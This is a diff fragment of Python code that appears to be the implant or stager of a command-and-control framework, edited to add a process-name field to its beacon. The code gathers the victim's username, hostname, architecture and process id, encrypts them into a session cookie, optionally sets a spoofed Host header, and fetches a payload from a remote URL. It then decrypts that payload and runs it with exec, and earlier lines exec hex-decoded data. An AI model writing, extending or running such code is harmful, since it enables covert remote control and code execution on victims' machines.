@@ -24,17 +24,19 @@ if pykey in b and pyhash == s and cstr < kdn:
     try:exec(bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8"))
     except:exec(b)
 else: sys.exit(0)
-un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
+un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid();pname="NA"
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
-headers = ({'Host':hh[0],'User-Agent':ua,'Cookie':'SessionID=%s' % encsid.decode("utf-8")})
-request = urllib2.Request(url2, headers=headers);response = urllib2.urlopen(request);html = response.read().decode('utf-8');x=decrypt(key, html)
+encsid=encrypt(key, '%s;%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,pname,urlid))
+if hh[0]: headers = ({'Host':hh[0],'User-Agent':ua,'Cookie':'SessionID=%s' % encsid.decode("utf-8")})
+else: headers = ({'User-Agent':ua,'Cookie':'SessionID=%s' % encsid.decode("utf-8")})
+request = urllib2.Request(url2, headers=headers);response = urllib2.urlopen(request);
+html = response.read().decode('utf-8');x=decrypt(key, html)
 exec(base64.b64decode(x))
-un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
+un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid();procname="python"
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
+encsid=encrypt(key, '%s;%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,procname,urlid))
 if hh[0]:r=urllib2.Request(url2,headers={'Host':hh[0],'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');
